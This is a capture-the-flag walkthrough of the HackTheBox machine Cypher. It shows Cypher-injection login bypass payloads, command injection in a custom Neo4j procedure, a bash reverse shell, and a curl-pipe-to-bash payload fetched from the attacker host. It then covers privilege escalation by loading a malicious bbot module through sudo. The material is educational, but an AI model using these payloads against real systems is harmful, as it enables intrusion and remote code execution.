Cypher starts with a website advertising a graph database. I’ll use cypher injection to bypass the login and get into the site. I’ll find a JAR file for a Neo4J extension and reverse engineer it to find command injection in a custom cypher method. I’ll abuse that to get a shell on the box, and pivot to the next user with a password in their bash history file. This user can run bbot as root, which I’ll exploit two ways to both get the flag and get a shell. In Beyond Root, I’ll show some steps that can be skipped with additional enumeration, and look at the interesting webserver configuration.

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

Based on the [OpenSSH and Apache](about:/cheatsheets/os#ubuntu) versions, the host is likely running Ubuntu 24.04 noble.

The webserver returns a redirect to `http://cypher.htb`. Given the use of virtual-host-based routing, I’ll use `ffuf` to brute force for any subdomains of `cypher.htb` that respond differently, but not find any. I’ll add this to my `hosts` file:

```
10.10.11.57 cypher.htb
```

### Website - TCP 80

#### Site

The site is for something calling itself Graph ASM:

![image-20250302070402183](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250302070402183.webp)

The about page claims it uses a proprietary engine for attack surface management (in a lot of buzz words).

The “Try our free demo” and “Login” links both go to `/login`:

![image-20250302070935203](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250302070935203.webp)

Trying admin/admin shows:

![image-20250302070958017](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250302070958017.webp)

#### Tech Stack

The HTTP headers don’t show anything besides nginx:

```
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Sun, 02 Mar 2025 12:04:35 GMT
Content-Type: text/html
Last-Modified: Mon, 17 Feb 2025 11:49:07 GMT
Connection: keep-alive
ETag: W/"67b32233-11d2"
Content-Length: 4562
```

The 404 page is also the [default nginx page](about:/cheatsheets/404#nginx):

![image-20250302074820046](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250302074820046.webp)

Wappalyzer doesn’t have anything to add either:

![image-20250302074847394](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250302074847394.webp)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```
oxdf@hacky$ feroxbuster -u http://cypher.htb

```

There’s a few things to note here:

- There’s a `/demo`, but it redirects to `/login`, so likely requires auth.
- `/api/auth` is returning 405 wrong method. This is where POST requests are sent for logging in, so this makes sense.
- `/api/docs` is interesting, but it just returns `{"detail":"Not Found"}`. There’s more fuzzing I can do against the API, and I’ll show that as an unintended path in [Beyond Root](#unintended-path).
- `/testing` is interesting.

`/testing` has directory listening enabled:

I’ll download this `.jar` file.

### custom-apoc-extension-1.0-SNAPSHOT.jar

#### Purpose

[Neo4J](https://neo4j.com/) is a Graph database product, and one that shares a lot of the buzz words present on the website. Amongst readers of this site it may be most well known as the backend for Bloodhound.

Awesome Procedures on Cypher (APOC) is a library of functions that extend Neo4j’s Cypher capabilities.

Based on the filename, it seems likely this Jar is a set of customs functions extending Neo4J to do some customer queries..

#### RE

JAR files are Java archive files holding a Java application. It’s actually just a Zip archive, and can be unzipped, but it’s easier to go directly to a tool like [jadx-gui](https://github.com/skylot/jadx). Opening the file shows it has only a couple classes:

![image-20250302080006571](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250302080006571.webp)

`HelloWorldProcedure` is just what is it sounds like. Nothing interesting.

`CustomFunctions` has a function called `getUrlStatusCode`:

```java
public class CustomFunctions {
    @Procedure(name = "custom.getUrlStatusCode", mode = Mode.READ)
    @Description("Returns the HTTP status code for the given URL as a string")
    public Stream<StringOutput> getUrlStatusCode(@Name("url") String url) throws Exception {
        if (!url.toLowerCase().startsWith("http://") && !url.toLowerCase().startsWith("https://")) {
            url = "https://" + url;
        }
        String[] command = {"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
        System.out.println("Command: " + Arrays.toString(command));
        Process process = Runtime.getRuntime().exec(command);
        BufferedReader inputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
        StringBuilder errorOutput = new StringBuilder();
        while (true) {
            String line = errorReader.readLine();
            if (line == null) {
                break;
            }
            errorOutput.append(line).append("\n");
        }
        String statusCode = inputReader.readLine();
        System.out.println("Status code: " + statusCode);
        boolean exited = process.waitFor(10L, TimeUnit.SECONDS);
        if (!exited) {
            process.destroyForcibly();
            statusCode = "0";
            System.err.println("Process timed out after 10 seconds");
        } else {
            int exitCode = process.exitValue();
            if (exitCode != 0) {
                statusCode = "0";
                System.err.println("Process exited with code " + exitCode);
            }
        }
        if (errorOutput.length() > 0) {
            System.err.println("Error output:\n" + errorOutput.toString());
        }
        return Stream.of(new StringOutput(statusCode));
    }

    /* loaded from: custom-apoc-extension-1.0-SNAPSHOT.jar:com/cypher/neo4j/apoc/CustomFunctions$StringOutput.class */
    public static class StringOutput {
        public String statusCode;

        public StringOutput(String statusCode) {
            this.statusCode = statusCode;
        }
    }
}
```

It is very much command injectable here:

```java
String[] command = {"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
System.out.println("Command: " + Arrays.toString(command));
Process process = Runtime.getRuntime().exec(command);
```

`url` is the input to the function, so if I can find where this is called, I can likely get RCE.

### Cypher Injection

#### Identify

I’ll try adding a single quote to the username, and the error coming back is long:

![image-20250302071057968](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250302071057968.webp)

In Burp I can see that trying to login sends a POST request to `/api/auth`, and the response here has the full error:

```

Takeaways here:

- The crash is in a Python application.
- There’s multiple references to the [Neo4J graph database](https://neo4j.com/), including both of the exceptions raised, which are `neo4j.exceptions.CypherSyntaxError`.
- The full query being run is also there:
	```sql
	MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = '{input}' return h.value as hash
	```

#### Bypass Login

This query is getting all the `USER` nodes that have an outgoing `SECRET` relationship to a `SHA1` node. Then it filters the `USER` nodes to only those where the `name` property matches the input name. Then it returns the hash value of the linked `SHA1` node.

I can assume that that hash is compared to the hash of the input password to see if the login attempt should succeed. I’ll guess that the hash value is 40 hex characters, but it could also be binary or some other encoding. It just needs to be something to compare to the output of hashing my input, and hex characters certainly seems easiest from the developer’s point of view.

I want to have this query return the SHA1 hash of the password I give it, ignoring the DB. For example, “9948e7baab1783a947c469c4c61e9f4bcce559b0” is the SHA1 of “0xdf”. My first thought is to try something like:

```bash
' RETURN "9948e7baab1783a947c469c4c61e9f4bcce559b0" AS hash; //
```

This would make the query:

```sql
MATCH (u:USER) -[:SECRET]-> (h:SHA1)
WHERE u.name = '' 
RETURN "9948e7baab1783a947c469c4c61e9f4bcce559b0" AS hash;//' return h.value as hash
```

This doesn’t work. ChatGPT explains the reason:

![image-20250302074114416](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250302074114416.webp)

Originally I used a UNION payload to make this work:

```sql
' return h.value as hash UNION return "9948e7baab1783a947c469c4c61e9f4bcce559b0" AS hash LIMIT 1;//
```

This makes:

```sql
MATCH (u:USER) -[:SECRET]-> (h:SHA1)
WHERE u.name = ''
return h.value as hash
UNION return "9948e7baab1783a947c469c4c61e9f4bcce559b0" AS hash
LIMIT 1;//' return h.value as hash
```

Because the user won’t match, it’ll return my hash. Entering that into the username field with the password “0xdf” works:

![image-20250302074422478](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250302074422478.webp)

There’s a shorter way to do this with a simple `OR true`:

```sql
' OR true return "9948e7baab1783a947c469c4c61e9f4bcce559b0" AS hash;//
```

#### Further Cypher Injection

With this injection, I could go the route of doing blind boolean injections using the return of a successful login or not as a way to ask questions of the database. I could also try exfiling data using a technique like `LOAD CSV` like I showed in [OnlyForYou](about:/2023/08/26/htb-onlyforyou.html#extracting-information), but it turns out there’s no interesting data in the database.

At this point, especially with the command injection already identified, I’ll turn focus to the authenticated site.

### Command Injection

#### Site

The site has a bar at the top to specify a query. There are seven predefined queries to choose from:

![image-20250302081114038](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250302081114038.webp)

Selecting one of these populates the text input next to it. For example, selecting “Select All” fills it with:

![image-20250302081145767](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250302081145767.webp)

The queries are:

| Name | Query |
| --- | --- |
| Select All | `MATCH (n) RETURN n` |
| DNS Names | `MATCH (n:DNS_NAME) RETURN n` |
| IP Addresses | `MATCH (n:DNS_NAME) RETURN n` |
| HTTP Statuses | `MATCH (n:DNS_NAME) WHERE n.scope_distance = 0 CALL custom.getUrlStatusCode(n.data) YIELD statusCode RETURN n.data, statusCode` |
| TXT Records | `MATCH (n1)-[:TXT]->(n2) RETURN n1,n2` |
| MX Records | `MATCH (n1)-[:MX]->(n2) RETURN n1,n2` |
| NS Records | `MATCH (n1)-[:NS]->(n2) RETURN n1,n2` |

I’ll note in HTTP Statuses query it’s using the `custom.getUrlStatusCode` function!

If I run the HTTP Statuses query, it hangs for a while (due to timeouts trying to reach sites that can’t be routed to from the HTB machine) and then shows the status code for each node:

 ![image-20250302081049426](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250302081049426.webp)![expand](/icons/expand.png)

#### RCE POC

I could do the command injection into the existing query, but to make it a bit cleaner, I’ll use the `CALL` Neo4j directive to call the function, entering `CALL custom.getUrlStatusCode("localhost; id") YIELD statusCode` into the bar. The result has the output of `id`:

![image-20250302082226730](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250302082226730.webp)

#### Shell

I’ll play around with updating the query to contain a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw), but couldn’t get the quoting to work out. Instead I’ll save that shell to a file on my host:

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.6/443 0>&1
```

Now with my Python webserver in that directory (`python -m http.server 80`), I’ll inject the command to get it and pip it to `bash`:

```sql
CALL custom.getUrlStatusCode("cypher.htb; curl 10.10.14.6/shell | bash; ") YIELD statusCode Return statusCode
```

It hits my webserver:

```
10.10.11.57 - - [02/Mar/2025 18:19:13] "GET /shell HTTP/1.1" 200 -
```

And then connects a shell:

```
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.57 49302
bash: cannot set terminal process group (1427): Inappropriate ioctl for device
bash: no job control in this shell
neo4j@cypher:/$
```

I’ll upgrade the shell using [the standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```
neo4j@cypher:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
neo4j@cypher:/$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
neo4j@cypher:/$
```

## Shell as graphasm

### Enumeration

There’s a bunch of enumeration that shows a rather unique web setup, but isn’t important to escalating to the next user or root, so I’ll cover it in [Beyond Root](#webserver-configuration).

Looking at users on the box, there’s one user with a home directory in `/home`:

```
neo4j@cypher:/home$ ls
graphasm
```

Interestingly, in addition to graphasm and root, the neo4j user has a shell configured in `passwd`:

```
neo4j@cypher:/$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
graphasm:x:1000:1000:graphasm:/home/graphasm:/bin/bash
neo4j:x:110:111:neo4j,,,:/var/lib/neo4j:/bin/bash
```

Typically service accounts like www-data or neo4j don’t have shells configured. neo4j’s home directory is `/var/lib/neo4j`. That directory even has a `.bash_history` file, suggesting that someone has logged in as that use and run commands:

```
neo4j@cypher:~$ ls -la
total 52
drwxr-xr-x 11 neo4j adm   4096 Feb 17 16:39 .
drwxr-xr-x 50 root  root  4096 Feb 17 16:48 ..
-rw-r--r--  1 neo4j neo4j   63 Oct  8 18:07 .bash_history

drwxr-xr-x  2 neo4j adm   4096 Feb 17 16:24 labs
drwxr-xr-x  2 neo4j adm   4096 Aug 16  2024 licenses
-rw-r--r--  1 neo4j adm     52 Oct  2 15:55 packaging_info

lrwxrwxrwx  1 neo4j adm      9 Oct  8 18:07 .viminfo -> /dev/null
```

The `.bash_history` file has a single command setting up the initial password for Neo4j:

```
neo4j@cypher:~$ cat .bash_history 
neo4j-admin dbms set-initial-password cU4btyib.20xtCMCXkBmerhK
```

### su / SSH

That password is shared with the graphasm user. It works with `su`:

```
neo4j@cypher:~$ su - graphasm
Password: 
graphasm@cypher:~$
```

And over SSH from my host:

```
oxdf@hacky$ sshpass -p 'cU4btyib.20xtCMCXkBmerhK' ssh graphasm@cypher.htb
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-53-generic x86_64)
...[snip]...
graphasm@cypher:~$
```

Either way I can read `user.txt`:

```
graphasm@cypher:~$ cat user.txt
2a10a1d6************************
```

## Shell as root

### Enumeration

The graphasm user can run `bbot` as root with `sudo`:

```
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

`bbot` is the [Bighuge BLS OSINT Tool](https://github.com/blacklanternsecurity/bbot), a multipurpose scanner for things like subdomains, web spirdering, email collecting, etc.

### Exploit

There are a couple ways to exploit this to get root:

#### Read root.txt

Any time I get a program that I can run as root with a lot of options, I’ll look for any that take in lines from a file. For example:

```

Some playing around with various options finds `-w`, which takes a whitelist of targets, as well as `-d` for debug more. Running that outputs:

```

There are probably other options that will do the same thing. This technique has it’s limits. It really struggles to read most files.

#### Create Module

[This page in the documentation](https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/) describes how to create a BBOT module. If I put a `.yml` file that defines the modules to run and where they live:

```yml
modules:
  - ExploitModule

module_dirs:
  - /dev/shm/
```

I’ll write that in `/dev/shm`, and then run `bbot` with `-p` pass this file:

```
graphasm@cypher:/dev/shm$ sudo bbot -p ./0xdf.yml 
  ______  _____   ____ _______
 |  ___ \|  __ \ / __ \__   __|
 | |___) | |__) | |  | | | |
 |  ___ <|  __ <| |  | | | |
 | |___) | |__) | |__| | | |
 |______/|_____/ \____/  |_|
 BIGHUGE BLS OSINT TOOL v2.1.0.4939rc

www.blacklanternsecurity.com/bbot

[WARN] Could not find scan module "ExploitModule". Did you mean "ip2location"?
```

It tries to find the module. It will load `ExploitModule.py` from `/dev/shm` based on that config, so I’ll write one:

```
graphasm@cypher:/dev/shm$ cat ExploitModule.py 
import os

os.system("id")
```

I could go ahead and make a full module, but this is enough to get execution:

```
graphasm@cypher:/dev/shm$ sudo bbot -p ./0xdf.yml 
  ______  _____   ____ _______
 |  ___ \|  __ \ / __ \__   __|
 | |___) | |__) | |  | | | |

```

It wants a class named `ExploitModule` (that extends the `BaseModule` class), but before it gets there to fail, it has run `id`.

If I replace the `id` command with `bash`, I get a shell:

```
graphasm@cypher:/dev/shm$ sudo bbot -p ./0xdf.yml

## Beyond Root

### Unintended Path

There’s an unintended path in Cypher that allows for skipping the Cypher injection to bypass the login entirely.

While the wordlist I typically use doesn’t have `cypher` in it, many from [SecLists](https://github.com/danielmiessler/SecLists) do, and so by brute forcing on `/api`, it can be identified:

```

```

For some reason, the `/api/cypher` endpoint doesn’t require auth, so I can just use it from here without auth:

```
oxdf@hacky$ curl $'http://cypher.htb/api/cypher?query=CALL+custom.getUrlStatusCode(\"localhost%3b+id\")+YIELD+statusCode'
[{"statusCode":"000uid=110(neo4j) gid=111(neo4j) groups=111(neo4j)"}]
```

### Webserver Configuration

#### /var/www

There are two directories in the standard website location:

```
root@cypher:/var/www# ls
graphasm  html
```

`html` just has the default debian nginx page. `graphasm` has the site:

```
root@cypher:/var/www# ls graphasm/
about.html               data.json            login.html               testing
bootstrap.bundle.min.js  highlight.min.js     logo.png                 us.png
bootstrap.min.css        index.html           monokai-sublime.min.css  utils.js
bootstrap-notify.min.js  jquery-3.6.1.min.js  sanitized.json           vivagraph.min.js
```

It’s a bit weird though as while the index, login, and about pages are there, there’s no demo page. `testing` does have the JAR file:

```
root@cypher:/var/www# ls graphasm/testing/
custom-apoc-extension-1.0-SNAPSHOT.jar
```

There’s also no connection information for Neo4J. This appears to be just the static part of the site.

#### nginx Config

`nginx` has only a single site configured:

```
root@cypher:/etc/nginx/sites-enabled# ls
default
```

It defines a single server homed in `/var/www/graphasm`:

```nginx
server {
        listen 80 default_server;
        server_name _;                                     

        if ($host != cypher.htb) {
            rewrite ^ http://cypher.htb/;
        }

        root /var/www/graphasm;
        index index.html;
...[snip]...                         
}
```

This also handles the redirect to `cypher.htb` if that isn’t the site.

The rest of that server configuration is a series of locations:

```nginx
location /demo {
    proxy_pass http://127.0.0.1:8000;              
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    include       /etc/nginx/mime.types;
    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
    include        fastcgi_params;                 
}

location /api {
    proxy_set_header Host $http_host;                                 
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;            
    proxy_set_header Upgrade $http_upgrade;                
    proxy_set_header Connection $http_connection;          
    proxy_redirect off;                                               
    proxy_buffering off;                                              
    proxy_pass http://127.0.0.1:8000;                                 
}

location / {
    root /var/www/graphasm;
    try_files $uri $uri/ @htmlext;                                    
    default_type  application/octet-stream;                           
    include  /etc/nginx/mime.types;                                   
}                              

location /testing {            
    alias /var/www/graphasm/testing/;                                 
    autoindex on;              
    try_files $uri $uri/ =404;                                        
}

location ~ \.html$ {           
    try_files $uri =404;                                              
}

location @htmlext {            
    rewrite ^(.*)$ $1.html last;                                      
}
```

`/demo` and `/api` are proxied to TCP 8000. The rest are hosting from `/var/www/graphasm`. This includes logic to add the `.html` extension, which is why visiting `/login` returns `login.html`.

#### Docker

Port 8000 is being served by Docker:

```
root@cypher:/# ss -tnlp | grep 8000
LISTEN 0      4096       127.0.0.1:8000      0.0.0.0:*    users:(("docker-proxy",pid=1786,fd=7))
```

This is visible in the process list as well:

```
root@cypher:/# ps auxww | grep 8000
root        1746  0.1  0.6  98068 25924 ?        Ssl  Jul22   1:56 /usr/local/bin/python3.9 /usr/local/bin/uvicorn app:app --reload --host 0.0.0.0 --port 8000 --root-path /api
root        1786  0.3  0.1 2188116 6364 ?        Sl   Jul22   4:27 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8000 -container-ip 172.18.0.2 -container-port 8000 -use-listen-fd
```

There’s a `uvicorn` process listening on 8000. That’s going to be inside the container. `docker ps` shows the container:

```
root@cypher:/# docker ps
CONTAINER ID   IMAGE                       COMMAND                  CREATED        STATUS        PORTS                      NAMES
d1313f9003f3   cypher-htb-fastapi:latest   "uvicorn app:app --r…"   4 months ago   Up 21 hours   127.0.0.1:8000->8000/tcp   fastapi
```

I can get a shell inside the container with `docker exec -it fastapi bash`. I’ll leave it here, though I’ll always recommend digging deeper into application source to understand how it works!
